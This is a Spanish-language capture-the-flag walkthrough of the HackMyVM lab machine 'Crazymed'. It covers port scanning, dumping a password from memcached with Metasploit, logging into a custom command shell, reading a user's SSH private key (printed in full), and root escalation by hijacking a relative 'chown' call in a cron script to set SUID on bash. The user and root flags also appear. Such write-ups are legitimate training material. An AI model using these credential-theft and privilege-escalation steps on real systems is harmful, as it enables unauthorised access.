---
icon: flag
layout:
  title:
    visible: true
  description:
    visible: false
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Crazymed HackMyVM (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-17 03:26 EDT
Nmap scan report for 192.168.5.41
Host is up (0.00095s latency).

PORT      STATE SERVICE   VERSION
22/tcp    open  ssh       OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 db:fb:b1:fe:03:9c:17:36:83:ac:6b:c0:52:ad:a0:05 (RSA)
|   256 56:3b:7c:e3:23:4a:25:5a:be:54:d1:2e:9d:44:9a:06 (ECDSA)
|_  256 81:d4:2e:47:33:34:a9:6f:10:70:c1:90:80:aa:b6:6a (ED25519)
80/tcp    open  http      Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
|_http-title: Crazymed Bootstrap Template - Index
4444/tcp  open  krb524?
| fingerprint-strings: 
|   GetRequest: 
|     [1;97mW
|     [1;97me
|     [1;97ml
|     [1;97mc
|     [1;97mo
|     [1;97mm
|     [1;97me
|     [1;97m 
|     [1;97mt
|     [1;97mo
|     [1;97m 
|     [1;97mt
|     [1;97mh
|     [1;97me
|     [1;97m 
|     [1;97mC
|     [1;97mr
|     [1;97ma
|     [1;97mz
|     [1;97my
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97m 
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97mi
|     [1;97mc
|     [1;97ma
|     [1;97ml
|     [1;97m 
|     [1;97mr
|     [1;97me
|     [1;97ms
|     [1;97me
|     [1;97ma
|     [1;97mr
|     [1;97mc
|     [1;97mh
|     [1;97m 
|     [1;97ml
|     [1;97ma
|     [1;97mb
|     [1;97mo
|     [1;97mr
|     [1;97ma
|     [1;97mt
|     [1;97mo
|     [1;97mr
|     [1;97my
|     [1;97m.
|     tests are performed on human volunteers for a fee.
|     Password: 
|     [1;31mAccess denied.
|     Password: 
|     [1;31mAccess denied.
|     Password:
|   NULL: 
|     [1;97mW
|     [1;97me
|     [1;97ml
|     [1;97mc
|     [1;97mo
|     [1;97mm
|     [1;97me
|     [1;97m 
|     [1;97mt
|     [1;97mo
|     [1;97m 
|     [1;97mt
|     [1;97mh
|     [1;97me
|     [1;97m 
|     [1;97mC
|     [1;97mr
|     [1;97ma
|     [1;97mz
|     [1;97my
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97m 
|     [1;97mm
|     [1;97me
|     [1;97md
|     [1;97mi
|     [1;97mc
|     [1;97ma
|     [1;97ml
|     [1;97m 
|     [1;97mr
|     [1;97me
|     [1;97ms
|     [1;97me
|     [1;97ma
|     [1;97mr
|     [1;97mc
|     [1;97mh
|     [1;97m 
|     [1;97ml
|     [1;97ma
|     [1;97mb
|     [1;97mo
|     [1;97mr
|     [1;97ma
|     [1;97mt
|     [1;97mo
|     [1;97mr
|     [1;97my
|     [1;97m.
|     tests are performed on human volunteers for a fee.
|_    Password:
11211/tcp open  memcached Memcached 1.6.9 (uptime 49 seconds)
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at 
https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port4444-TCP:V=7.95%I=7%D=6/17%Time=685118C0%P=x86_64-pc-linux-gnu%r(NU
SF:LL,2C3,"\x1b[H\x1b[2J\x1b[3J\x1b[1;97mW\x1b[0m\x1b[1;97me\x1b[0m
SF:\x1b[1;97ml\x1b[0m\x1b[1;97mc\x1b[0m\x1b[1;97mo\x1b[0m\x1b[1;97m
SF:m\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mt\x1b[0
SF:m\x1b[1;97mo\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mt\x1b[0m\x1b[1
SF:;97mh\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mC\x1
SF:b[0m\x1b[1;97mr\x1b[0m\x1b[1;97ma\x1b[0m\x1b[1;97mz\x1b[0m\x1b[
SF:1;97my\x1b[0m\x1b[1;97mm\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97md\x1b\
SF:[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mm\x1b[0m\x1b[1;97me\x1b[0m\x1b\
SF:[1;97md\x1b[0m\x1b[1;97mi\x1b[0m\x1b[1;97mc\x1b[0m\x1b[1;97ma\x1b
SF:[0m\x1b[1;97ml\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mr\x1b[0m\x1b
SF:[1;97me\x1b[0m\x1b[1;97ms\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97ma\x1
SF:b[0m\x1b[1;97mr\x1b[0m\x1b[1;97mc\x1b[0m\x1b[1;97mh\x1b[0m\x1b[
SF:1;97m\x20\x1b[0m\x1b[1;97ml\x1b[0m\x1b[1;97ma\x1b[0m\x1b[1;97mb\x
SF:1b[0m\x1b[1;97mo\x1b[0m\x1b[1;97mr\x1b[0m\x1b[1;97ma\x1b[0m\x1b\
SF:[1;97mt\x1b[0m\x1b[1;97mo\x1b[0m\x1b[1;97mr\x1b[0m\x1b[1;97my\x1b
SF:[0m\x1b[1;97m\.\x1b[0m\nAll\x20our\x20tests\x20are\x20performed\x20o
SF:n\x20human\x20volunteers\x20for\x20a\x20fee\.\n\n\nPassword:\x20")%r(Ge
SF:tRequest,30D,"\x1b[H\x1b[2J\x1b[3J\x1b[1;97mW\x1b[0m\x1b[1;97me\x
SF:1b[0m\x1b[1;97ml\x1b[0m\x1b[1;97mc\x1b[0m\x1b[1;97mo\x1b[0m\x1b\
SF:[1;97mm\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mt\
SF:x1b[0m\x1b[1;97mo\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mt\x1b[0m\
SF:x1b[1;97mh\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;9
SF:7mC\x1b[0m\x1b[1;97mr\x1b[0m\x1b[1;97ma\x1b[0m\x1b[1;97mz\x1b[0m
SF:\x1b[1;97my\x1b[0m\x1b[1;97mm\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;97m
SF:d\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mm\x1b[0m\x1b[1;97me\x1b[0
SF:m\x1b[1;97md\x1b[0m\x1b[1;97mi\x1b[0m\x1b[1;97mc\x1b[0m\x1b[1;97
SF:ma\x1b[0m\x1b[1;97ml\x1b[0m\x1b[1;97m\x20\x1b[0m\x1b[1;97mr\x1b[
SF:0m\x1b[1;97me\x1b[0m\x1b[1;97ms\x1b[0m\x1b[1;97me\x1b[0m\x1b[1;9
SF:7ma\x1b[0m\x1b[1;97mr\x1b[0m\x1b[1;97mc\x1b[0m\x1b[1;97mh\x1b[0m
SF:\x1b[1;97m\x20\x1b[0m\x1b[1;97ml\x1b[0m\x1b[1;97ma\x1b[0m\x1b[1;
SF:97mb\x1b[0m\x1b[1;97mo\x1b[0m\x1b[1;97mr\x1b[0m\x1b[1;97ma\x1b[0
SF:m\x1b[1;97mt\x1b[0m\x1b[1;97mo\x1b[0m\x1b[1;97mr\x1b[0m\x1b[1;97
SF:my\x1b[0m\x1b[1;97m\.\x1b[0m\nAll\x20our\x20tests\x20are\x20performe
SF:d\x20on\x20human\x20volunteers\x20for\x20a\x20fee\.\n\n\nPassword:\x20\
SF:x1b[1;31mAccess\x20denied\.\x1b[0m\n\nPassword:\x20\x1b[1;31mAccess\
SF:x20denied\.\x1b[0m\n\nPassword:\x20");
MAC Address: 08:00:27:50:C2:06 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 166.43 seconds
```

Veremos que hay varios puertos interesantes, entre ellos el puerto `4444` y el `11211`, en el reporte que nos da `nmap` ya vemos algo de informacion sobre todo en el puerto `4444` en estas lineas:

```
tests are performed on human volunteers for a fee.
|     Password: 
|     [1;31mAccess denied.
|     Password: 
|     [1;31mAccess denied.
|     Password:
|   NULL:
```

Vemos lo que parece un metodo de autenticacion, vamos a proba a conectarnos a dicho puerto desde `nc` a ver que pasa.

```shell
nc <IP_VICTIM> 4444
```

Info:

```
Welcome to the Crazymed medical research laboratory.
All our tests are performed on human volunteers for a fee.


Password: test
Access denied.
```

Vemos que efectivamente se esta utilizando un metodo de autenticacion en dicho puerto, por lo que vamos a ver si tuviera alguna vulnerabilidad para poder extraerlas o de algun otro sitio que las tuviera.

## Metasploit (memcached)

Vemos que el puerto `11211` esta utilizando `memcached` con el cual se puede extraer informacion del puerto `4444`, si nos vamos a `metasploit` y buscamos dicho puerto, veremos que efectivamente puede ser vulnerable a ello.

```shell
msfconsole -q
search memcached
```

Info:

```
Matching Modules
================

   #  Name                                               Disclosure Date  Rank    Check  Description
   -  ----                                               ---------------  ----    -----  -----------
   0  auxiliary/gather/memcached_extractor               .                normal  No     Memcached Extractor
   1  auxiliary/dos/misc/memcached                       .                normal  No     Memcached Remote Denial of Service
   2  auxiliary/scanner/memcached/memcached_amp          2018-02-27       normal  No     Memcached Stats Amplification Scanner
   3  auxiliary/scanner/memcached/memcached_udp_version  2003-07-23       normal  No     Memcached UDP Version Scanner


Interact with a module by name or index. For example info 3, use 3 or use auxiliary/scanner/memcached/memcached_udp_version
```

Vamos a seleccionar el numero `0`.

```shell
use auxiliary/gather/memcached_extractor
```

Ahora vamos a establecerle la `IP` de la maquina victima e iniciarlo.

```shell
set RHOSTS <IP>
run
```

Info:

```
[+] 192.168.5.41:11211    - Found 4 keys

Keys/Values Found for 192.168.5.41:11211
========================================

 Key            Value
 ---            -----
 conf_location  "VALUE conf_location 0 21\r\n/etc/memecacched.conf\r\nEND\r\n"
 domain         "VALUE domain 0 8\r\ncrazymed\r\nEND\r\n"
 log            "VALUE log 0 18\r\npassword: cr4zyM3d\r\nEND\r\n"
 server         "VALUE server 0 9\r\n127.0.0.1\r\nEND\r\n"

[+] 192.168.5.41:11211    - memcached loot stored at /root/.msf4/loot/20250617033508_default_192.168.5.41_memcached.dump_229509.txt
[*] 192.168.5.41:11211    - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

Vemos que ha funcionado y nos ha proporcionado `4` keys, por lo que vamos a reconstruirlas un poco de mejor forma.

La que mas nos interesa es esta:

```
log            "VALUE log 0 18\r\npassword: cr4zyM3d\r\nEND\r\n"
```

Por lo que vemos la contraseña seria `cr4zyM3d`, por lo que vamos a probarlo utilizando `nc` de nuevo para conectarnos.

## Escalate user brad

```shell
nc <IP_VICTIM> 4444
```

Metemos como contraseña `cr4zyM3d` y veremos que estaremos en una especie de `prompt` en el que podremos ejecutar comandos como si fuera una terminal, vamos a ver quienes somos.

```
Welcome to the Crazymed medical research laboratory.
All our tests are performed on human volunteers for a fee.


Password: cr4zyM3d
Access granted.

Type "?" for help.

System command: whoami
brad
System command: id
uid=1000(brad) gid=1000(brad) groups=1000(brad),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),112(bluetooth)
```

Vemos que somos el usuario `brad`, vamos a ver si tuviera alguna `id_rsa` para conectarnos por `SSH` de mejor forma.

```shell
cat /home/brad/.ssh/id_rsa
```

Info:

```
-----BEGIN OPENSSH PRIVATE KEY-----
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
KlxiCx/FiOytUAAAAKYnJhZEBkYW5nYQE=
-----END OPENSSH PRIVATE KEY-----
```

Vemos que si obtuvimos la `id_rsa` por lo que vamos a conectarnos por `SSH` con dicha `id_rsa`.

### SSH

```shell
ssh -i id_rsa brad@<IP>
```

Info:

```
Linux crazymed 5.10.0-19-amd64 #1 SMP Debian 5.10.149-2 (2022-10-21) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon Oct 31 18:36:58 2022 from 192.168.0.29
brad@crazymed:~$ whoami
brad
```

Con esto veremos que ya estaremos dentro con dicho usuario, por lo que leeremos la `flag` del usuario.

> user.txt

```
f70a9801673220fb56f42cf9d5ddc28b
```

## Escalate Privileges

Si nos vamos al `/opt` veremos un archivo llamado `check_VM` el cual parece bastante interesante, si lo leemos veremos lo siguiente.

```bash
#! /bin/bash

#users flags
flags=(/root/root.txt /home/brad/user.txt)
for x in "${flags[@]}"
do
if [[ ! -f $x ]] ; then
echo "$x doesn't exist"
mcookie > $x
chmod 700 $x
fi
done

chown -R www-data:www-data /var/www/html

#bash_history => /dev/null
home=$(cat /etc/passwd |grep bash |awk -F: '{print $6}')

for x in $home
do
ln -sf /dev/null $x/.bash_history ; eccho "All's fine !"
done


find /var/log -name "*.log*" -exec rm -f {} +
```

Vemos que esta utilizando el `chown` como ruta relativa, por lo que se podria hacer un `Path Hijacking`, si observamos el `PATH` que tenemos a nivel de sistema.

```shell
echo $PATH
```

Info:

```
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

Veremos que tiene una vulnerabilidad y es que esta cogiendo antes los binarios que se depositen en el `/local/bin` que en el `/bin` por lo que nosotros podremos crear ahi el `chown` y establecer con permisos de `SUID` la `bash`, vamos a creer que este archivo lo esta ejecutando `root` por detras con un `crontab`, vamos a probar a crear el archivo.

```shell
nano /usr/local/bin/chown

#Dentro del nano
#!/bin/bash

chmod u+s /bin/bash
```

Establecemos los permisos de ejecuccion.

```shell
chmod +x /usr/local/bin/chown
```

Lo guardamos y esperamos un rato a ver si surge efecto, despues de un rato si listamos la `bash`.

```shell
ls -la /bin/bash
```

Info:

```
-rwsr-xr-x 1 root root 1234376 Mar 27  2022 /bin/bash
```

Veremos que ha funcionado, por lo que haremos lo siguiente para ser `root`.

```shell
bash -p
```

Info:

```
bash-5.1# whoami
root
```

Con esto veremos que ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
b9b38d9533ca00072eff46338bf21b43
```
